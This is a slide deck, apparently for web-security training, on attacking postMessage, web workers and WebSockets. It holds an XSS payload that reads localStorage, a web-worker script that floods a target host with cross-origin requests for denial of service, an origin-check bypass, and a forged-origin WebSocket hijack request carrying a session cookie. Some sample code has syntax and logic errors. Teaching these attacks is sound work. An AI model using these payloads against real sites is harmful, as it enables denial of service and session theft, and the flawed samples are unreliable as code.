<!-- .slide: class="center" -->
# Web Worker/API/Socket
--
# Topics to be covered

1. Injection in web message and workers
1. Attacking webworker
1. Attacking APIs
1. Attacking WebSockets
--

# Basic understanding

1. Iframes can't talk to each other
1. windows can't talk to each other

--
<!-- .slide: class="center" -->
# HTML5 says 

--
<!-- .slide: class="center" -->
# Lets Break it.

--

# Web message

1. A way to communicate with iframes or windows
<pre>
￼window.postMessage("message", "example1.com");
</pre>
1. Web messaging is supported by Opera, Chrome, and Safari. 
1. Internet Explorer 8+ partially supports cross-document messaging: it currently works with iframes, but not new windows. 

--

# Recieve message

<pre>
window.addEventListener ("message", receiveMessage, false);

receiveMessage function (event) {

	event.source.postMessage("Message recieved");

}
</pre>

**What is wrong here** 

--

# or should it be 

<pre>
window.addEventListener ("message", receiveMessage, false);

receiveMessage function (event) {

if(message.orgin.indexOf("example.com")!=-1) { 

}

else

{

	event.source.postMessage("Message recieved");

}
</pre>

--
<!-- .slide: class="center" -->
# Can you think of a bypass

--
<!-- .slide: class="center" -->
# What about 
<center>
**example.com.attacker.com**
</center>
--

# or 

<pre>
window.addEventListener ("message", receiveMessage, false);

receiveMessage function (event) {

if (event.origin != "http://example1.com") { 
// Verifying the origin 
return;
}

else {

	event.source.postMessage("Message recieved");

}
</pre>

--

# Attack

1. If no check or incorrect check any page can send message and action would be taken on it.

Example:

1. test1.html
1. test2.html

Notes:
1. store a localstorage object and then embed it in and pop that out
&lt;img src=# onerror="alert(localStorage.getItem('Confidential'))" />


--
<!-- .slide: class="center" -->
# WebWorkers

--

# What

1. multithreading in Javascript
1. backend / long running task's offloaded to webworker
1. The webworkers don’t have access to the DOM elements
1. But it does allow us to send in-domain and cross origin requests with XHR
1. “Postmessage” is used to send a message to the worker, and 
1. “onmessage” is used to receive the data from the webworker

--
# Create new worker

<pre>
￼var worker=new Worker("worker.js");
</pre>

--
# interaction
<pre>

worker.postMessage("foo"); 

// Using postMessage to send a message to webworkers.

worker.onmessage=function(evt){ 

// Function receive data from worker.js 

document.getElementById("result").innerHTML=evt.data; 

// Outputting the data.

}

</pre>

--

# worker.js

<pre>

onmessage=function(evt){ 

// Function used to receive data from the main thread. 

var w=evt.data; 

//The received data is saved to evt.data.

postMessage(w); 

// It’s then posted back to the main thread.

}
</pre>

Notes:
worker.postMessage('&lt;img src=# onerror=alert(localStorage.getItem("Confidential")) />');

--

# Workers : DDoS

1. As per tests : 10k cross origin requests per minute per browser is possible via webworkers.
1. so 60 people == 100K requests per minute.

Notes:
Access-Control-Allow-Origin

--

# DoS

<pre>
onmessage = function(event){start()} 

function start() {

	var i=0;

	var st = (new Date).getTime(); 

	while(i < 5000)	{

		var cor = new XMLHttpRequest();

		i++;

		cor.open('GET', 'http://targetfordos.com');

		cor.send();
	}

	msg = "Completed " + i + " requests in " + (st - (new Date).getTime()) + " milliseconds";

	postMessage(msg); 
}
</pre>

--

<!-- .slide: class="center" -->
# WebSockets

--

# WebSockets

1. full-duplex communication channels between browsers and servers
1. can exchange text and binary messages pushed from the server to the browser as well as vice versa
--
# Potential Issues

1. not restrained by the same-origin policy
1. Anyone can initiate a websocket connection
1. can be both secure and insecure (ws and wss)

Notes: 
Firefox doesn't allows insecure connections
--
# initiate a WebSocket Connection
<pre>
￼function testWebSocket()
{
	websocket = new WebSocket(wsURI);
  websocket.onopen = function(evt) { onOpen(evt)};
  websocket.onmessage = function(evt) { onMessage(evt)};
  websocket.onclose = function(evt) { onClose(evt)};
  websocket.onerror = function(evt) { onError(evt)};
}
</pre>

--

# websocket Callback

<pre>
function onMessage(evt)
{
writeToScreen('<span>Response: ' + evt.data + '</span>');
websocket.close();
}
function writeToScreen(message)
{
	var pre= document.createElement("p");
	pre.style.wordWrap = "break-word";
	pre.innerHTML = message;
	output.appendChild(pre);
}
</pre>

--
# Cross-Site WebSocket Hijacking

1. CSRF for websockets


--
# Legit Request
<pre>
GET /trading/ws/stockPortfolio HTTP/1.1
Host: www.some-trading-application.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:23.0) Firefox/23.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Sec-WebSocket-Version: 13
Origin: https://www.some-trading-application.com
**Sec-WebSocket-Key: x7nPlaiHMGDBuJeD6l7y/Q==**
**Cookie: JSESSIONID=1A9431CF043F851E0356F5837845B2EC**
Connection: keep-alive, Upgrade
Pragma: no-cache
Cache-Control: no-cache
Upgrade: websocket
</pre>

--
# Attacker
<pre>
GET /trading/ws/stockPortfolio HTTP/1.1
Host: www.some-trading-application.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:23.0) Firefox/23.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Sec-WebSocket-Version: 13
Origin: https://www.some-evil-attacker-application.com
**Sec-WebSocket-Key: hP+ghc+KuZT2wQgRRikjBw==**
**Cookie: JSESSIONID=1A9431CF043F851E0356F5837845B2EC**
Connection: keep-alive, Upgrade
Pragma: no-cache
Cache-Control: no-cache
Upgrade: websocket
</pre>
--

# check Hijacking

<pre>
ws = new WebSocket("wss://echo.websocket.org");
ws.onmessage = function(evt) { console.log(evt.data) };
ws.send("Test");

</pre>

--

# Sample Attack

<pre>
&lt;a href=javascript:alert(1)>CLICKHERE&lt;/a>
</pre>